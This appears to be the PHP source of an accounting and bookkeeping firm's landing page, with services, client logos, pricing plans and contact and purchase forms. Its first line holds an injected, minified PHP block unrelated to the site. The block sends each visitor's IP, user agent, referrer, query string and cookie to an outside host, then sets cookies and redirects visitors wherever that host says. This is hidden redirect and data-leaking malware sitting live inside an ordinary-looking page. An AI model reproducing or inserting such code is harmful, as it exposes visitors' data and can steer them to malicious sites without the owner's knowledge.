<?php error_reporting(E_ALL & ~E_NOTICE);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");$id = "240543";$uid="clbyxq42e192znjatkzd028el";$qu=$_SERVER["QUERY_STRING"];$postdata = http_build_query(array("lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref" => $_SERVER["HTTP_REFERER"],"ip" =>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn" => $_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query" => $_SERVER["QUERY_STRING"],"ua" => $_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id" =>$uid,"id" => $id));$opts = array("http" =>array("method" => "POST","header" => "Content-type: application/x-www-form-urlencoded","content" => $postdata));$context = stream_context_create($opts);$url="http://jcibj.com/pcl.php";$result=file_get_contents($url,false,$context);$arr=explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0]==="true"){if(strstr($arr[1],"sp.php")){$q="";}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9]);}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}?>
<? include ("includes/header.php") ?>
<body>
	<? include ("includes/navbar.php") ?>

	<div class="banner-img">
		<div class="banner-text">
			<h3>Call <?= $phone ?> To Get Your Accounts Done</h3>
		</div>
	</div>

	<div class="section scrollspy" id="about">
		<h4 class="center-align">ABOUT US</h4>
		<div class="divide"></div><br><br>
		<div class="row">
			<div class="col s12 m4">
				<h5 class="justify-text">Let us help you in running your business by taking the pain of bookkeeping.</h5>
			</div>
			<div class="col s12 m7 offset-m1">
				<p class="justify-text">We are <?= $companyname ?>, an accounting and bookkeeping firm located in the United States. Since its inception, we have exceled in our field and have achieved a total of more than 100+ clients.</p>
			</div>
		</div>
		<br><br>
		<h5 class="center-align">What Makes Us The Best</h5>
		<br>
		<div class="row center-align">
			<div class="col s12 m4">
				<a class="btn-floating btn-large waves-effect waves-light light-blue darken-2"><i class="material-icons">school</i></a>
				<p><b>HIGHLY EXPERIENCED CPAs</b></p>
				<p>We have a team of highly qualified CPAs and Bookkeepers who have a combined experience of more than 100 years.</p>
			</div>
			<div class="col s12 m4">
				<a class="btn-floating btn-large waves-effect waves-light light-blue darken-2"><i class="material-icons">headset_mic</i></a>
				<p><b>AWESOME CUSTOMER SUPPORT</b></p>
				<p>Get in touch with us round the clock as our customer service is always active to server you no matter what.</p>
			</div>
			<div class="col s12 m4">
				<a class="btn-floating btn-large waves-effect waves-light light-blue darken-2"><i class="material-icons">account_balance</i></a>
				<p><b>BUSINESS CONSULTANCY</b></p>
				<p>Need to learn who you can grow your business more? Get in touch with us and we can work something out of it.</p>
			</div>
		</div>
	</div>

	<div class="section grey lighten-3 scrollspy" id="services">
		<h4 class="center-align">SERVICES WE PROVIDE</h4>
		<div class="divide"></div><br><br>
		<div class="row">
			<div class="col s12 hide-on-med-and-up">
				<img src="images/mid_linda.png" alt="" class="responsive-img">
			</div>
			<div class="col s12 m4">
				<div class="card-panel hoverable squared">
					<i class="fas fa-book small"></i>
					<h5 class="left-align">Accounting &amp; Bookkeeping</h5>
				</div>
				<div class="card-panel hoverable squared">
					<i class="fas fa-chart-bar small"></i>
					<h5 class="left-align">Tax Preparation &amp; Planning</h5>
				</div>
				<div class="card-panel hoverable squared">
					<i class="far fa-credit-card small"></i>
					<h5 class="left-align">Payroll Management &amp; Services</h5>
				</div>
			</div>
			<div class="col m4 hide-on-small-only">
				<img src="images/mid_linda.png" alt="" class="responsive-img">
			</div>
			<div class="col s12 m4">
				<div class="card-panel hoverable squared">
					<i class="fas fa-university small"></i>
					<h5 class="left-align">Business Consulting &amp; Management</h5>
				</div>
				<div class="card-panel hoverable squared">
					<i class="fas fa-calculator small"></i>
					<h5 class="left-align">QuickBooks &amp; Sage Accounting</h5>
				</div>
				<div class="card-panel hoverable squared">
					<i class="fas fa-mobile small"></i>
					<h5 class="left-align">24/7 Customer Service &amp; Support</h5>
				</div>
			</div>
		</div>
	</div>

	<div class="section scrollspy" id="projects">
		<h4 class="center-align">CLIENTS WE HAVE HELPED</h4>
		<div class="divide"></div><br><br>
		<div class="row">
			<div class="col s12 m6 l4">
				<div class="card-panel squared z-depth-5 content-container">
					<img src="images/p1_linda.png" alt="" class="responsive-img">
					<div class="content-area">
						<div class="text">
							Yes Fitness Gym
						</div>
					</div>
				</div>
			</div>
			<div class="col s12 m6 l4">
				<div class="card-panel squared z-depth-5 content-container">
					<img src="images/p2_linda.png" alt="" class="responsive-img">
					<div class="content-area">
						<div class="text">
							Paramount Coaching
						</div>
					</div>
				</div>
			</div>
			<div class="col s12 m6 l4">
				<div class="card-panel squared z-depth-5 content-container">
					<img src="images/p3_linda.png" alt="" class="responsive-img">
					<div class="content-area">
						<div class="text">
							Cyankart
						</div>
					</div>
				</div>
			</div>
			<div class="col s12 m6 l4">
				<div class="card-panel squared z-depth-5 content-container">
					<img src="images/p4_linda.png" alt="" class="responsive-img">
					<div class="content-area">
						<div class="text">
							Ultra Enviro
						</div>
					</div>
				</div>
			</div>
			<div class="col s12 m6 l4">
				<div class="card-panel squared z-depth-5 content-container">
					<img src="images/p5_linda.png" alt="" class="responsive-img">
					<div class="content-area">
						<div class="text">
							Silvio Casa
						</div>
					</div>
				</div>
			</div>
			<div class="col s12 m6 l4">
				<div class="card-panel squared z-depth-5 content-container">
					<img src="images/p6_linda.png" alt="" class="responsive-img">
					<div class="content-area">
						<div class="text">
							Karney Designs
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>

	<div class="testimonial">
		<div class="testimonial-text">
			<img src="images/t4_linda.jpg" alt="" class="responsive-img circle">
			<h5>Gretchen</h5>
			<p>I love the way <?= $companyname ?> make my work so easy. As a business owner now I can focus on my work rather than sending hours on checking my accounts. I would recommend <?= $companyname ?> to all of my friends who are into business.</p>
		</div>
	</div>

	<div class="section scrollspy" id="plans">
		<h4 class="center-align">TRANSPARENT PRICE PLANS</h4>
		<div class="divide"></div><br><br>
		<div class="row">
			<div class="col s12 m6 l4">
				<div class="card-panel z-depth-5 plan-name">
					<p>ACCOUNTING ESSENTIALS</p>
					<h5>$ 149.99 / Mo</h5>
				</div>
				<div class="card-panel squared z-depth-5">
					<ul class="browser-default">
						<li>Calculating Sales &amp; Expense</li><br>
						<li>Reconciliation of 2 accounts</li><br>
						<li>Genarate custom invoices</li><br>
						<li>Get Detailed Estimates</li><br>
						<li>Manage and pay bills</li><br>
						<li>Instant Profit &amp; Loss reports</li><br>
						<li>Track your inventory</li><br>
					</ul>
				</div>
				<a href="#buy" class="btn-large squared wide-btn light-blue darken-2 modal-trigger">Buy Now</a>
			</div>

			<div class="col s12 m6 l4">
				<div class="card-panel z-depth-5 plan-name">
					<p>PAYROLL EXPERTS</p>
					<h5>$ 199.99 / Mo</h5>
				</div>
				<div class="card-panel squared z-depth-5">
					<ul class="browser-default">
						<li>Six bank or credit card accounts reconcile</li><br>
						<li>Full-service Accounts Receivable AND Accounts Payable</li><br>
						<li>One hour of financial consulting per month</li><br>
						<li>Sales Tax Tracking &amp; Reporting</li><br>
						<li>Access to monthly webinars</li><br>
						<li>Budget Reporting</li>
					</ul>
				</div>
				<a href="#buy" class="btn-large squared wide-btn light-blue darken-2 modal-trigger">Buy Now</a>
			</div>

			<div class="col s12 m6 l4">
				<div class="card-panel z-depth-5 plan-name">
					<p>TAX MANAGERS</p>
					<h5>$ 249.99 / Mo</h5>
				</div>
				<div class="card-panel squared z-depth-5">
					<ul class="browser-default">
						<li>Asset Management</li><br>
						<li>Tax-time &amp; audit support</li><br>
						<li>Four bank or credit card accounts reconcile</li><br>
						<li>Full-service Accounts Receivable OR Accounts Payable</li><br>
						<li>Budget Reporting</li><br>
						<li>Free 24/7 Chat &amp; Phone Support For Enterprise Customers</li>
					</ul>
				</div>
				<a href="#buy" class="btn-large squared wide-btn light-blue darken-2 modal-trigger">Buy Now</a>
			</div>
		</div>
	</div>

	<div class="section grey lighten-3 scrollspy" id="contact">
		<h4 class="center-align">GET IN TOUCH WITH US</h4>
		<div class="divide"></div><br><br>
		<div class="card-panel squared z-depth-5">
			<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3022.4623152676754!2d-73.98165628459383!3d40.75185537932758!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x89c2590106771a2d%3A0x889f4c3c540e7343!2sLefcourt+Colonial+Building%2C+295+Madison+Ave+12th+Floor%2C+New+York%2C+NY+10017%2C+USA!5e0!3m2!1sen!2sin!4v1522322169460" width="100%" height="450" frameborder="0" style="border:0" allowfullscreen></iframe>
		</div>

		<div class="row">
			<div class="col s12 m4">
				<div class="card-panel squared z-depth-0 grey darken-3 center-align white-text">
					<i class="material-icons small">map</i>
					<p><?= $address ?></p>
				</div>
			</div>
			<div class="col s12 m4">
				<div class="card-panel squared z-depth-0 grey darken-3 center-align white-text">
					<i class="material-icons small">smartphone</i>
					<p><?= $phone ?></p><br>
				</div>
			</div>
			<div class="col s12 m4">
				<div class="card-panel squared z-depth-0 grey darken-3 center-align white-text">
					<i class="material-icons small">email</i>
					<p><?= $email ?></p><br>
				</div>
			</div>
		</div>

		<form action="form/contact.php" method="POST" class="row">
			<div class="input-field col s12 m4">
				<input type="text" class="contact" name="name" placeholder="Name">
			</div>
			<div class="input-field col s12 m4">
				<input type="email" class="contact" name="email" placeholder="Email">
			</div>
			<div class="input-field col s12 m4">
				<input type="text" class="contact" name="phone" placeholder="Phone">
			</div>
			<div class="input-field col s12">
				<input type="text" class="contact" name="query" placeholder="Query">
			</div>
			<div class="input-field col s12 m4">
				<button class="btn-large light-blue darken-2 squared" value="submit">Submit query</button>
			</div>
		</form>
	</div>

	<div id="buy" class="modal modal-fixed-footer" style="width: 40%">
		<div class="modal-content center-align">
			<h5 style="padding-bottom: 15px">PURCHASE FORM</h5>
			<div class="input-field">
				<input type="text" class="contact" name="name" placeholder="Name">
			</div>
			<div class="input-field">
				<input type="email" class="contact" name="email" placeholder="Email">
			</div>
			<div class="input-field">
				<input type="password" class="contact" name="pass" placeholder="Password">
			</div>
			<div class="input-field">
				<input type="password" class="contact" name="re-pass" placeholder="Retype Password">
			</div>
		</div>
		<div class="modal-footer">
			<a href="#!" class="modal-action modal-close waves-effect waves-green btn-flat">Buy Now</a>
		</div>
	</div>

	<? include ("includes/footer.php") ?>


	<!--  Scripts-->
	<script src="https://code.jquery.com/jquery-2.1.1.min.js"></script>
	<script src="js/materialize.js"></script>
	<script src="js/init.js"></script>

	<script>
		$(document).ready(function(){
			$('.scrollspy').scrollSpy();
			$('.modal').modal();
			// $("#about").hide();
			$("#haha").click(function(){
				$("#about").fadeIn(1000);
			});
		});
	</script>
	</body>
</html>
